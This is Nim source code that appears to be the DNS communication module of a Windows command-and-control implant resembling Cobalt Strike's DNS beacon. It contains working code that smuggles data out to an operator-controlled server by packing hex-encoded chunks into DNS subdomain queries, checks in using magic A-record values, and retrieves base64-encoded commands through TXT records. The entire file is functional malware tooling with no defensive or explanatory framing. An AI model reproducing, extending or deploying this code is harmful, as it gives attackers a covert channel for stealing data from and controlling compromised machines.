import ../[config, utils, meta]
import std/[strutils, random, strformat, base64, os, endians]
import winim
import winim/winstr

const
    DNS_A_NO_CHECKIN    = 240
    DNS_A_CHECKIN       = 241
    DNS_TXT_NO_CHECKIN  = 242
    DNS_TXT_CHECKIN     = 243
    DNS_AAAA_NO_CHECKIN = 244
    DNS_AAAA_CHECKIN    = 245

randomize()
proc gen_random_id(): string = $(rand(0x10000000..0x7fffffff).int32)

proc ipv4_string_to_dword(ip: string): DWORD =
    var parts = ip.split(".")
    if parts.len != 4: return
    for i in 0..<4:
        var tmp = parseInt(parts[i])
        if tmp < 0 or tmp > 255: return
        result += cast[DWORD](tmp shl (8 * i) and 0xffffffff)

proc ipv4_dword_to_string(ip: DWORD): string =
    var s: seq[string]
    for i in 0..<4:
        var tmp = (cast[uint32](ip) and (0xFF.uint32 shl (8 * i))) shr (8 * i)
        s.add($tmp)
    return s.join(".")

proc ip_xor(ip, mask: string): string =
    var ip_dword = ipv4_string_to_dword(ip)
    var mask_dword = ipv4_string_to_dword(mask)
    var result_dword = ip_dword xor mask_dword
    return ipv4_dword_to_string(result_dword)

var dns_server: IP4_ARRAY
dns_server.AddrCount = 1
dns_server.AddrArray[0] = ipv4_string_to_dword(config.host)

proc dns_query_raw(host: string, query_type: WORD): (seq[string], bool) =
    var record: PDNS_RECORD
    result[1] = true
    var ret = DnsQuery_W(+$host, query_type, DNS_QUERY_STANDARD, &dns_server, &record, NULL)
    if ret != ERROR_SUCCESS:
        result[1] = false
        dbg fmt"[-] DNS query {host} returns {ret}, error: {GetLastError()}"
        return
    defer: DnsRecordListFree(record, dnsFreeRecordList)

    var r = record
    while r != NULL:
        case r.wType
        of DNS_TYPE_A:
            result[0].add(ipv4_dword_to_string(r.Data.A.IpAddress))
        of DNS_TYPE_AAAA:
            var ipv6: seq[string]
            var w = r.Data.AAAA.Ip6Address.IP6Word
            for i in 0..<8:
                ipv6.add(toHex(w[i]))
            result[0].add(ipv6.join(":"))
        of DNS_TYPE_TEXT:
            setOpenArrayStringable(true)
            defer: setOpenArrayStringable(false)
            for i in 0..<r.Data.TXT.dwStringCount:
                result[0].add($(r.Data.TXT.pStringArray[i]))
        else:
            dbg "[-] Unknown DNS record type: " & $r.wType
        r = r.pNext

proc dns_get_txt(data: seq[byte]): seq[byte] =
    var cnt = 0
    var request_id = gen_random_id()
    var (cmd_len_bytes, success) = dns_query_raw(fmt"{dns_txt}{cnt:x}{request_id}.{dns_base_domain}", DNS_TYPE_A)
    if cmd_len_bytes.len == 0: return
    cnt += 1

    var txt_total:string
    var cmd_len_raw = ipv4_string_to_dword(cmd_len_bytes[0])
    var cmd_len_u32: uint32
    bigEndian32(cmd_len_u32.addr, cmd_len_raw.addr)
    var cmd_len = cmd_len_u32.int
    while cmd_len > 0:
        var (txt, success) = dns_query_raw(fmt"{dns_txt}{cnt}{request_id}.{dns_base_domain}", DNS_TYPE_TEXT)
        if txt.len == 0: return
        txt_total = txt_total & txt[0]
        cnt += 1
        cmd_len -= txt[0].len div 4 * 3 # base64 decoded length
        sleep(5000)
    return base64.decode(txt_total).toSeq

proc send_request_dns_post*(data: seq[byte], prefix: string): seq[byte] =
    var request_id = gen_random_id()
    var cnt = 0
    while true:
        var query = fmt"{prefix}1{data.len:x}.{cnt:x}{request_id}.{dns_base_domain}"
        var (_, success) = dns_query_raw(query, DNS_TYPE_A)
        if success: break
        sleep(5000)

    var encoded_data = data.toString.toHex
    var available_len = 248 - prefix.len - request_id.len - dns_base_domain.len - fmt"{cnt:x}".len - 15
    available_len -= available_len mod 4
    var section_len = available_len div 4
    while encoded_data.len > available_len:
        cnt += 1
        while true:
            var query = fmt"{prefix}4{encoded_data.substr(0, section_len-1)}.{encoded_data.substr(section_len, section_len*2-1)}.{encoded_data.substr(section_len*2, section_len*3-1)}.{encoded_data.substr(section_len*3, section_len*4-1)}.{cnt:x}{request_id}.{dns_base_domain}"
            var (_, success) = dns_query_raw(query, DNS_TYPE_A)
            if success: break
            sleep(5000)
        encoded_data = encoded_data[available_len..<encoded_data.len]

    cnt += 1
    var segment = encoded_data.len div 56
    var remain = encoded_data.len mod 56
    var query: string
    if remain != 0:
        query = fmt"{prefix}{segment+1:x}{encoded_data[0..<remain]}."
    else:
        query = query & fmt"{prefix}{segment:x}"
    for i in 0..<segment:
        query = query & fmt"{encoded_data[remain+i*56..<remain+(i+1)*56]}."
    query = query & fmt"{cnt:x}{request_id}.{dns_base_domain}"
    while true:
        var (_, success) = dns_query_raw(query, DNS_TYPE_A)
        if success: break

proc send_request_dns_get*(data: seq[byte]): seq[byte] =
    var (ip_list, success) = dns_query_raw(dns_base_domain, DNS_TYPE_A)
    if ip_list.len== 0:
        dbg "[-] Dns query returns no ip"
        return
    var ip = ip_list[0]

    var parts = ip.split(".")
    var int_part = parseInt(parts[3])
    if parts[0] == "0" and parts[1] == "0" and parts[2] == "0" and int_part >= 240 and int_part <= 245:
        case int_part
        of DNS_A_CHECKIN, DNS_TXT_CHECKIN, DNS_AAAA_CHECKIN:
            # todo: every checkin should use different query type
            return send_request_dns_post(data, post_metadata_prefix)
        of DNS_A_NO_CHECKIN, DNS_AAAA_NO_CHECKIN:
            dbg "[-] not implemented query"
        of DNS_TXT_NO_CHECKIN:
            return dns_get_txt(data)
        else:
            dbg "[-] unknown query type"